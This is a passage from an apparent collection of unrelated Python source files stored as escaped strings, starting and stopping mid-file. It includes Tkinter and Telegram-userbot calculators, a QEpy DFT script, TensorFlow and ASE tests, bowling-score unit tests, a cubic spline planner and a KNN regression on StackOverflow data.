except:\r\n                lbVisor2.config(text=\"erro!\")\r\n        elif rec.widget==btLimpa:\r\n            calc = \"\"\r\n            lbVisor.config(text=calc)\r\n            lbVisor2.config(text=calc)\r\n        elif rec.widget==btApaga:\r\n            calc = calc[:-1]\r\n            lbVisor.config(text=calc)\r\n        elif rec.widget==btIgual:\r\n            try:\r\n                res = eval(calc)  \r\n                calc= str(res)\r\n                lbVisor2.config(text= calc)       \r\n            except:\r\n                lbVisor2.config(text=\"erro!\")\r\n    #ENTRA VIA TELCADO \r\n    except:\r\n        if rec==\"0\":\r\n            calc+=\"0\"\r\n            lbVisor.config(text=calc)\r\n        elif rec==\"1\":\r\n            calc+=\"1\"\r\n            lbVisor.config(text=calc)\r\n        elif rec==\"2\":\r\n            calc+=\"2\"\r\n            lbVisor.config(text=calc)\r\n        elif rec==\"3\":\r\n            calc+=\"3\"\r\n            lbVisor.config(text=calc)\r\n        elif rec==\"4\":\r\n            calc+=\"4\"\r\n            lbVisor.config(text=calc)\r\n        elif rec==\"5\":\r\n            calc+=\"5\"\r\n            lbVisor.config(text=calc)\r\n        elif rec==\"6\":\r\n            calc+=\"6\"\r\n            lbVisor.config(text=calc)\r\n        elif rec==\"7\":\r\n            calc+=\"7\"\r\n            lbVisor.config(text=calc)\r\n        elif rec==\"8\":\r\n            calc+=\"8\"\r\n            lbVisor.config(text=calc)\r\n        elif rec==\"9\":\r\n            calc+=\"9\"\r\n            lbVisor.config(text=calc)\r\n        elif rec==\".\":\r\n            calc+=\".\"\r\n            lbVisor.config(text=calc)\r\n        elif rec==\"shift+5\":\r\n            i=0\r\n            pos=0\r\n            while i < len(calc):\r\n                l = calc[i]\r\n                if (l==\"+\" or (l==\"-\") or (l==\"*\") or (l==\"/\")):\r\n                    pos = i\r\n                i+=1\r\n            op=calc[pos]\r\n            i=0\r\n            nCalc=\"\"\r\n            while i < pos:\r\n                l = calc[i]\r\n                nCalc+=l\r\n                i+=1\r\n            i=0\r\n            pos=pos+1\r\n            rest=\"\"\r\n            while pos < len(calc):\r\n                l = calc[pos]\r\n                rest+=l\r\n                pos+=1\r\n            res = eval(nCalc)  \r\n            if op == \"+\":\r\n                    rs=float(res)/100*float(rest)\r\n                    calc=float(res)+rs\r\n            elif op == \"-\":\r\n                    rs=float(res)/100*float(rest)\r\n                    calc=float(res)-rs\r\n            elif op == \"*\":\r\n                    rs=float(res)/100*float(rest)\r\n                    calc=rs\r\n            elif op == \"/\":\r\n                    rs=float(res)/100*float(rest)\r\n                    calc=float(res)/rs\r\n            calc=str(calc)\r\n            lbVisor2.config(text=calc)\r\n        elif rec==\"+\":\r\n            calc+=\"+\"\r\n            lbVisor.config(text=calc)\r\n        elif rec==\"-\":\r\n            calc+=\"-\"\r\n            lbVisor.config(text=calc)\r\n        elif rec==\"*\":\r\n            calc+=\"*\"\r\n            lbVisor.config(text=calc)\r\n        elif rec==\"/\":\r\n            calc+=\"/\"\r\n            lbVisor.config(text=calc)\r\n        elif rec==\"esc\":\r\n            calc= \"\"\r\n            lbVisor.config(text=calc)\r\n            lbVisor2.config(text=calc)\r\n        elif rec==\"backspace\":\r\n            calc = calc[:-1]\r\n            lbVisor.config(text=calc)\r\n        elif rec==\"enter\":\r\n            try:\r\n                res = eval(calc)  \r\n                calc= str(res)\r\n                lbVisor2.config(text= calc)       \r\n            except:\r\n                lbVisor2.config(text=\"erro!\")\r\n\r\n\r\n#Binds BOTAO\r\nbt0.bind(\"\",entrada)\r\nbt1.bind(\"\",entrada)\r\nbt2.bind(\"\",entrada)\r\nbt3.bind(\"\",entrada)\r\nbt4.bind(\"\",entrada)\r\nbt5.bind(\"\",entrada)\r\nbt6.bind(\"\",entrada)\r\nbt7.bind(\"\",entrada)\r\nbt8.bind(\"\",entrada)\r\nbt9.bind(\"\",entrada)\r\nbtApaga.bind(\"\",entrada)\r\nbtLimpa.bind(\"\",entrada)\r\nbtPonto.bind(\"\",entrada)\r\nbtPercert.bind(\"\",entrada)\r\nbtIgual.bind(\"\",entrada)\r\nbtSoma.bind(\"\",entrada)\r\nbtSubi.bind(\"\",entrada)\r\nbtDiv.bind(\"\",entrada)\r\nbtMult.bind(\"\",entrada)\r\nbtPoten.bind(\"\",entrada)\r\nbtFcose.bind(\"\",entrada)\r\nbtFseno.bind(\"\",entrada)\r\nbtFtang.bind(\"\",entrada)\r\nbtRaiz.bind(\"\",entrada)\r\n\r\n#MAPEAMENTO DE TECLAS\r\nlistTeclas = [\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\",\"0\",\".\",\",\",\"*\",\"+\",\"-\",\"/\",\"enter\",\"esc\",\"backspace\",\"shift+5\"]\r\nteclas = list(listTeclas)\r\n\r\n#FUNCAO DE ENTRADA DE TECLAS\r\ndef listen(tecla):\r\n    while True:\r\n        keyboard.wait(tecla)\r\n        entrada(tecla)\r\n        print(\"- Tecla pressionada: \",tecla)\r\n        \r\nthreads = [Thread(target=listen, kwargs={\"tecla\":tecla}) for tecla in teclas]\r\n\r\nfor thread in threads:\r\n    thread.start()\r\n\r\n\r\n#INICIALIZANDO CALCULADORA\r\napp.mainloop()\r\n", "406": "#!/usr/bin/env python3\nimport qepy\nimport time\n\ntry:\n    from mpi4py import MPI\n    comm = MPI.COMM_WORLD\nexcept Exception:\n    comm = None\n\nfrom qepy.calculator import QEpyCalculator\n\ninputfile = 'qe_in.in'\n\ncalc = QEpyCalculator(comm = comm, inputfile = inputfile)\n\nget_potential_energy      = calc.get_potential_energy()\nget_forces                = calc.get_forces()\nget_stress                = calc.get_stress()\nget_density               = calc.get_density()\nget_bz_k_points           = calc.get_bz_k_points()\nget_effective_potential   = calc.get_effective_potential()\nget_eigenvalues           = calc.get_eigenvalues()\nget_fermi_level           = calc.get_fermi_level()\nget_ibz_k_points          = calc.get_ibz_k_points()\nget_k_point_weights       = calc.get_k_point_weights()\nget_magnetic_moment       = calc.get_magnetic_moment()\nget_number_of_bands       = calc.get_number_of_bands()\nget_number_of_grid_points = calc.get_number_of_grid_points()\nget_number_of_spins       = calc.get_number_of_spins()\nget_occupation_numbers    = calc.get_occupation_numbers()\nget_pseudo_density        = calc.get_pseudo_density()\nget_pseudo_wave_function  = calc.get_pseudo_wave_function()\nget_spin_polarized        = calc.get_spin_polarized()\nget_xc_functional         = calc.get_xc_functional()\n\ntime.sleep(0.1)\n\nif calc.rank == 0 :\n    print('ncharge:', get_density.sum()*calc.atoms.get_volume()/get_density.shape[0] , flush = True)\n    print(\"calc.get_potential_energy()           =\" , get_potential_energy           , flush = True)\n    print(\"calc.get_forces()[0]                  =\" , get_forces[0]                  , flush = True)\n    print(\"calc.get_stress()[0]                  =\" , get_stress[0]                  , flush = True)\n    print(\"calc.get_density()[0]                 =\" , get_density[0]                 , flush = True)\n    print(\"calc.get_bz_k_points()[:, 0]          =\" , get_bz_k_points[:, 0]          , flush = True)\n    print(\"calc.get_effective_potential()[0]     =\" , get_effective_potential[0]     , flush = True)\n    print(\"calc.get_eigenvalues()[0]             =\" , get_eigenvalues[0]             , flush = True)\n    print(\"calc.get_fermi_level()                =\" , get_fermi_level                , flush = True)\n    print(\"calc.get_ibz_k_points()[:, 0]         =\" , get_ibz_k_points[:, 0]         , flush = True)\n    print(\"calc.get_k_point_weights()[0]         =\" , get_k_point_weights[0]         , flush = True)\n    print(\"calc.get_magnetic_moment()            =\" , get_magnetic_moment            , flush = True)\n    print(\"calc.get_number_of_bands()            =\" , get_number_of_bands            , flush = True)\n    print(\"calc.get_number_of_grid_points()      =\" , get_number_of_grid_points      , flush = True)\n    print(\"calc.get_number_of_spins()            =\" , get_number_of_spins            , flush = True)\n    print(\"calc.get_occupation_numbers()[0]      =\" , get_occupation_numbers[0]      , flush = True)\n    print(\"calc.get_pseudo_density()[0]          =\" , get_pseudo_density[0]          , flush = True)\n    print(\"calc.get_pseudo_wave_function()[0, 0] =\" , get_pseudo_wave_function[0, 0] , flush = True)\n    print(\"calc.get_spin_polarized()             =\" , get_spin_polarized             , flush = True)\n    print(\"calc.get_xc_functional()              =\" , get_xc_functional              , flush = True)\n\ntime.sleep(0.1)\nprint('ncharge - > rank {} : {}'.format(calc.rank, get_pseudo_density.sum()*calc.atoms.get_volume()/get_number_of_grid_points.prod()), flush=True)\n", "407": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "408": "#!/usr/bin/env python\nimport scoring\n\n\ndef test_calc_score1():\n    assert scoring.calc_score(\"2:1,1,2,2\") == \"2,6\"\n\ndef test_calc_score2():\n    assert scoring.calc_score(\"3:1,4,6,4,7,0\") == \"5,22,29\"\n\ndef test_calc_score3():\n    assert scoring.calc_score(\"3:0,0,9,1,0,0\") == \"0,10,10\"\n\n\n# Level 1 answers\ndef test_calc_score4():\n    assert scoring.calc_score(\"3:1,2,6,4,5,2\") == \"3,18,25\"\n\ndef test_calc_score5():\n    assert scoring.calc_score(\"2:1,2,6,4,5\") == \"3,18\"\n\ndef test_calc_score6():\n    assert scoring.calc_score(\"1:2,8,5\") == \"15\"\n\ndef test_calc_score7():\n    assert scoring.calc_score(\"3:0,0,9,1,0,0\") == \"0,10,10\"\n\n# Level 2 answers\ndef test_calc_score8():\n    assert scoring.calc_score(\"4:1,5,5,5,4,6,8,1\") == \"6,20,38,47\"\n\ndef test_calc_score9():\n    assert scoring.calc_score(\"3:1,5,5,5,4,6,8\") == \"6,20,38\"\n\n\n# Level 3 answers\ndef test_calc_score10():\n    assert scoring.calc_score(\"3:1,4,10,2,5\") == \"5,22,29\"\n\ndef test_calc_score11():\n    assert scoring.calc_score(\"1:10,1,3\") == \"14\"\n\ndef test_calc_score12():\n    assert scoring.calc_score(\"3:3,4,10,1,2\") == \"7,20,23\"\n\ndef test_calc_score13():\n    assert scoring.calc_score(\"2:3,4,10,1,2\") == \"7,20\"\n\n\n# Level 4 answers\ndef test_calc_score14():\n    assert scoring.calc_score(\"4:1,4,10,10,3,6\") == \"5,28,47,56\"\n\ndef test_calc_score15():\n    assert scoring.calc_score(\"3:10,10,10,3,6\") == \"30,53,72\"\n\ndef test_calc_score16():\n    assert scoring.calc_score(\"4:1,5,10,10,1,7\") == \"6,27,45,53\"\n\ndef test_calc_score17():\n    assert scoring.calc_score(\"3:1,5,10,10,1,7\") == \"6,27,45\"\n\n# Level 5 answers\ndef test_calc_score18():\n    assert scoring.calc_score(\"3:1,4,10,7,3,8\") == \"5,25,43\"\n\ndef test_calc_score19():\n    assert scoring.calc_score(\"2:7,3,10,1,4\") == \"20,35\"\n\ndef test_calc_score20():\n    assert scoring.calc_score(\"4:2,7,10,4,6,4,5\") == \"9,29,43,52\"\n\ndef test_calc_score21():\n    assert scoring.calc_score(\"4:2,7,4,6,10,4,5\") == \"9,29,48,57\"\n\ndef test_calc_score22():\n    assert scoring.calc_score(\"3:2,7,4,6,10,4,5\") == \"9,29,48\"\n\n\n# Level 6 answers\ndef test_calc_score23():\n    assert scoring.calc_score(\"10:1,4,4,5,6,4,5,5,10,0,1,7,3,6,4,10,2,8,6\") == \"5,14,29,49,60,61,77,97,117,133\"\n\ndef test_calc_score24():\n    assert scoring.calc_score(\"10:1,4,4,5,6,4,5,5,10,0,1,7,3,6,4,10,2,8,6\") == \"5,14,29,49,60,61,77,97,117,133\"\n\ndef test_calc_score25():\n    assert scoring.calc_score(\"10:0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0\") == \"0,0,0,0,0,0,0,0,0,0\"\n\ndef test_calc_score26():\n    assert scoring.calc_score(\"10:10,10,10,10,10,10,10,10,10,10,10,10\") == \"30,60,90,120,150,180,210,240,270,300\"\n\ndef test_calc_score27():\n    assert scoring.calc_score(\"10:7,2,1,9,6,4,5,5,10,3,7,7,3,6,4,10,2,8,6\") == \"9,25,40,60,80,97,113,133,153,169\"\n\n", "409": "import pytest\nfrom ase.build import molecule\nfrom ase.test.factories import ObsoleteFactoryWrapper\n\n\nrequired = {'aims': dict(sc_accuracy_rho=5.e-3)}\n\n\n@pytest.mark.parametrize('name', ['aims', 'gamess_us', 'gaussian'])\ndef test_h2dft_old(name):\n    factory = ObsoleteFactoryWrapper(name)\n    run(factory)\n\n\ncalc = pytest.mark.calculator\n\n\n#@calc('abinit', ecut=200, toldfe=0.0001)\n# Doesn't work with abinit9.\n# We should replace the restart stuff anyway.\n@calc('cp2k', auto_write=True, uks=True)\n# @calc('gpaw', mode='lcao', basis='sz(dzp)')\ndef test_h2dft(factory):\n    run(factory)\n\n\ndef run(factory):\n    name = factory.name\n    par = required.get(name, {})\n    calc = factory.calc(label=name, xc='LDA', **par)\n    h2 = molecule('H2', calculator=calc)\n    h2.center(vacuum=2.0)\n    e2 = h2.get_potential_energy()\n    calc.set(xc='PBE')\n    e2pbe = h2.get_potential_energy()\n    h1 = h2.copy()\n    del h1[1]\n    h1.set_initial_magnetic_moments([1])\n    h1.calc = calc\n    e1pbe = h1.get_potential_energy()\n    calc.set(xc='LDA')\n    e1 = h1.get_potential_energy()\n    try:\n        m1 = h1.get_magnetic_moment()\n    except NotImplementedError:\n        pass\n    else:\n        print(m1)\n    print(2 * e1 - e2)\n    print(2 * e1pbe - e2pbe)\n    print(e1, e2, e1pbe, e2pbe)\n    calc = factory.calc(restart=name)\n    print(calc.parameters, calc.results, calc.atoms)\n    assert not calc.calculation_required(h1, ['energy'])\n    h1 = calc.get_atoms()\n    print(h1.get_potential_energy())\n    label = 'dir/' + name + '-h1'\n    calc = factory.calc(label=label, atoms=h1, xc='LDA', **par)\n    print(h1.get_potential_energy())\n", "410": "\"\"\"\nCubic spline planner\n\nAuthor: Atsushi Sakai(@Atsushi_twi)\n\n\"\"\"\nimport math\nimport numpy as np\nimport bisect\n\n\nclass Spline:\n    \"\"\"\n    Cubic Spline class\n    \"\"\"\n\n    def __init__(self, x, y):\n        self.b, self.c, self.d, self.w = [], [], [], []\n\n        self.x = x\n        self.y = y\n\n        self.nx = len(x)  # dimension of x\n        h = np.diff(x)\n\n        # calc coefficient c\n        self.a = [iy for iy in y]\n\n        # calc coefficient c\n        A = self.__calc_A(h)\n        B = self.__calc_B(h)\n        self.c = np.linalg.solve(A, B)\n        #  print(self.c1)\n\n        # calc spline coefficient b and d\n        for i in range(self.nx - 1):\n            self.d.append((self.c[i + 1] - self.c[i]) / (3.0 * h[i]))\n            tb = (self.a[i + 1] - self.a[i]) / h[i] - h[i] * \\\n                (self.c[i + 1] + 2.0 * self.c[i]) / 3.0\n            self.b.append(tb)\n\n    def calc(self, t):\n        \"\"\"\n        Calc position\n\n        if t is outside of the input x, return None\n\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = self.a[i] + self.b[i] * dx + \\\n            self.c[i] * dx ** 2.0 + self.d[i] * dx ** 3.0\n\n        return result\n\n    def calcd(self, t):\n        \"\"\"\n        Calc first derivative\n\n        if t is outside of the input x, return None\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = self.b[i] + 2.0 * self.c[i] * dx + 3.0 * self.d[i] * dx ** 2.0\n        return result\n\n    def calcdd(self, t):\n        \"\"\"\n        Calc second derivative\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = 2.0 * self.c[i] + 6.0 * self.d[i] * dx\n        return result\n\n    def __search_index(self, x):\n        \"\"\"\n        search data segment index\n        \"\"\"\n        return bisect.bisect(self.x, x) - 1\n\n    def __calc_A(self, h):\n        \"\"\"\n        calc matrix A for spline coefficient c\n        \"\"\"\n        A = np.zeros((self.nx, self.nx))\n        A[0, 0] = 1.0\n        for i in range(self.nx - 1):\n            if i != (self.nx - 2):\n                A[i + 1, i + 1] = 2.0 * (h[i] + h[i + 1])\n            A[i + 1, i] = h[i]\n            A[i, i + 1] = h[i]\n\n        A[0, 1] = 0.0\n        A[self.nx - 1, self.nx - 2] = 0.0\n        A[self.nx - 1, self.nx - 1] = 1.0\n        #  print(A)\n        return A\n\n    def __calc_B(self, h):\n        \"\"\"\n        calc matrix B for spline coefficient c\n        \"\"\"\n        B = np.zeros(self.nx)\n        for i in range(self.nx - 2):\n            B[i + 1] = 3.0 * (self.a[i + 2] - self.a[i + 1]) / \\\n                h[i + 1] - 3.0 * (self.a[i + 1] - self.a[i]) / h[i]\n        return B\n\n\nclass Spline2D:\n    \"\"\"\n    2D Cubic Spline class\n\n    \"\"\"\n\n    def __init__(self, x, y):\n        self.s = self.__calc_s(x, y)\n        self.sx = Spline(self.s, x)\n        self.sy = Spline(self.s, y)\n\n    def __calc_s(self, x, y):\n        dx = np.diff(x)\n        dy = np.diff(y)\n        self.ds = np.hypot(dx, dy)\n        s = [0]\n        s.extend(np.cumsum(self.ds))\n        return s\n\n    def calc_position(self, s):\n        \"\"\"\n        calc position\n        \"\"\"\n        x = self.sx.calc(s)\n        y = self.sy.calc(s)\n\n        return x, y\n\n    def calc_curvature(self, s):\n        \"\"\"\n        calc curvature\n        \"\"\"\n        dx = self.sx.calcd(s)\n        ddx = self.sx.calcdd(s)\n        dy = self.sy.calcd(s)\n        ddy = self.sy.calcdd(s)\n        k = (ddy * dx - ddx * dy) / ((dx ** 2 + dy ** 2)**(3 / 2))\n        return k\n\n    def calc_yaw(self, s):\n        \"\"\"\n        calc yaw\n        \"\"\"\n        dx = self.sx.calcd(s)\n        dy = self.sy.calcd(s)\n        yaw = math.atan2(dy, dx)\n        return yaw\n\n\ndef calc_spline_course(x, y, ds=0.1):\n    sp = Spline2D(x, y)\n    s = list(np.arange(0, sp.s[-1], ds))\n\n    rx, ry, ryaw, rk = [], [], [], []\n    for i_s in s:\n        ix, iy = sp.calc_position(i_s)\n        rx.append(ix)\n        ry.append(iy)\n        ryaw.append(sp.calc_yaw(i_s))\n        rk.append(sp.calc_curvature(i_s))\n\n    return rx, ry, ryaw, rk, s\n\n\ndef main():  # pragma: no cover\n    print(\"Spline 2D test\")\n    import matplotlib.pyplot as plt\n    x = [-2.5, 0.0, 2.5, 5.0, 7.5, 3.0, -1.0]\n    y = [0.7, -6, 5, 6.5, 0.0, 5.0, -2.0]\n    ds = 0.1  # [m] distance of each interpolated points\n\n    sp = Spline2D(x, y)\n    s = np.arange(0, sp.s[-1], ds)\n\n    rx, ry, ryaw, rk = [], [], [], []\n    for i_s in s:\n        ix, iy = sp.calc_position(i_s)\n        rx.append(ix)\n        ry.append(iy)\n        ryaw.append(sp.calc_yaw(i_s))\n        rk.append(sp.calc_curvature(i_s))\n\n    plt.subplots(1)\n    plt.plot(x, y, \"xb\", label=\"input\")\n    plt.plot(rx, ry, \"-r\", label=\"spline\")\n    plt.grid(True)\n    plt.axis(\"equal\")\n    plt.xlabel(\"x[m]\")\n    plt.ylabel(\"y[m]\")\n    plt.legend()\n\n    plt.subplots(1)\n    plt.plot(s, [np.rad2deg(iyaw) for iyaw in ryaw], \"-r\", label=\"yaw\")\n    plt.grid(True)\n    plt.legend()\n    plt.xlabel(\"line length[m]\")\n    plt.ylabel(\"yaw angle[deg]\")\n\n    plt.subplots(1)\n    plt.plot(s, rk, \"-r\", label=\"curvature\")\n    plt.grid(True)\n    plt.legend()\n    plt.xlabel(\"line length[m]\")\n    plt.ylabel(\"curvature [1/m]\")\n\n    plt.show()\n\n\nif __name__ == '__main__':\n    main()\n", "411": "# Ultroid - UserBot\n# Copyright (C) 2021-2022 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.del_key(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "412": "from sklearn.feature_extraction.text import CountVectorizer\r\nimport pandas as pd\r\nfrom nltk.stem import WordNetLemmatizer\r\nimport numpy as np\r\nfrom sklearn.neighbors import KNeighborsRegressor\r\nfrom sklearn.metrics import mean_squared_log_error\r\nfrom matplotlib import pyplot as plt\r\n\r\n# reading data\r\n# rawdata = pd.read_csv('C:/Users/gaura/Desktop/songs/StackOverflow2million/StackOverflow2million.csv')\r\nrawdata = pd.read_csv('Data/data.csv')\r\n\r\n# attaching tags to questions with weight = 2 for tags\r\ntitle_tags = rawdata[:]\r\ntitle_tags.columns = title_tags.columns.str.lower()\r\ntitle_tags.questions_tags = title_tags.questions_tags.str.replace('|', ' ')\r\ntitle_tags.questions_tags2 = title_tags.questions_tags.str.cat(title_tags.questions_tags, sep = ' ')\r\ntitle_tags.questions_title = title_tags.questions_title.str.cat(title_tags.questions_tags2, sep = ' ')\r\n\r\n# pass analyser to CountVectorizer\r\nwnl = WordNetLemmatizer()\r\nanalyzer = CountVectorizer().build_analyzer()\r\n\r\n# method for lemmatization\r\ndef lemmatized_words(doc):\r\n    return (wnl.lemmatize(w) for w in analyzer(doc))\r\n\r\nvectorizer = CountVectorizer(analyzer=lemmatized_words, stop_words='english')\r\n\r\n\r\n# generates train and test matrix based on the index provided\r\ndef traintest(test1, test2):\r\n    testdata = title_tags[test1: test2]\r\n    #     print testdata.head()\r\n    drop = pd.Series(range(test1, test2))\r\n    #     print drop\r\n    traindata = title_tags.drop(title_tags.index[[drop]])\r\n    #     traindata = title_tags[:]\r\n    #     traindata = traindata.drop(traindata.index[[test1,test2]])\r\n    #     print traindata.head()\r\n    train_xformed = vectorizer.fit_transform(traindata.questions_title)\r\n    # print train_xformed.shape\r\n    test_xformed = vectorizer.transform(testdata.questions_title)\r\n    # print test_xformed.shape\r\n    time = traindata.time\r\n    time = time.astype('float64')\r\n    return (train_xformed, test_xformed, time)\r\n\r\n\r\n# function responsible for prediction after generation of train, test matrices\r\ndef predictor(ind1, ind2):\r\n    ans = []\r\n    split = traintest(ind1, ind2)\r\n    regressor = KNeighborsRegressor(n_neighbors=3, weights='distance')\r\n    regressor = regressor.fit(split[0], split[2])\r\n    iterations = int((ind2 - ind1) / 200)\r\n    i1 = 0\r\n    neigh = [0] * 200\r\n    dist = [0] * 200\r\n    for x in range(iterations):\r\n        test = split[1]\r\n        y = regressor.predict(test[i1:(i1 + 200)])\r\n        ans.extend(y)\r\n        i1 = i1 + 200\r\n    return ans\r\n\r\n\r\n# testing 10 sets of 1000 records(taken from 10 sets of 200000 records)\r\n# ans1 = predictor(1950000,1951000)\r\n# ans2 = predictor(150000,151000)\r\n# ans3 = predictor(350000,351000)\r\n# ans4 = predictor(550000,551000)\r\n# ans5 = predictor(750000,751000)\r\n# ans6 = predictor(950000,951000)\r\n# ans7 = predictor(1150000,1151000)\r\n# ans8 = predictor(1350000,1351000)\r\n# ans9 = predictor(1550000,1551000)\r\n# ans10 = predictor(1750000,1751000)\r\n\r\n# running with subset of data, 100,000 records\r\nans1 = predictor(0,1000)\r\nans2 = predictor(10000,11000)\r\nans3 = predictor(20000,21000)\r\nans4 = predictor(30000,31000)\r\nans5 = predictor(40000,41000)\r\nans6 = predictor(50000,51000)\r\nans7 = predictor(60000,61000)\r\nans8 = predictor(70000,71000)\r\nans9 = predictor(80000,81000)\r\nans10 = predictor(90000,91000)\r\n\r\n\r\n# function for calculating accuracy\r\ndef calc_accuracy(arr, ind1, ind2):\r\n    tc = 0\r\n    timetest = title_tags[ind1:ind2].time.astype('float64')\r\n    for x, y in np.nditer([arr, timetest]):\r\n        if abs(x - y) <= 36000:\r\n            tc = tc + 1\r\n    return tc\r\n\r\n\r\n# function for calculating mean_squared_log_error\r\ndef calc_meanlog(arr, ind1, ind2):\r\n    timetest = title_tags[ind1:ind2].time.astype('float64')\r\n    l1 = []\r\n    l2 = []\r\n\r\n    for x in range(1000):\r\n        l1.append(arr[x] / 3600)\r\n\r\n    for x in range(1000):\r\n        l2.append(timetest[ind1 + x] / 3600)\r\n\r\n    return mean_squared_log_error(l2, l1)\r\n\r\n\r\nacc1 = 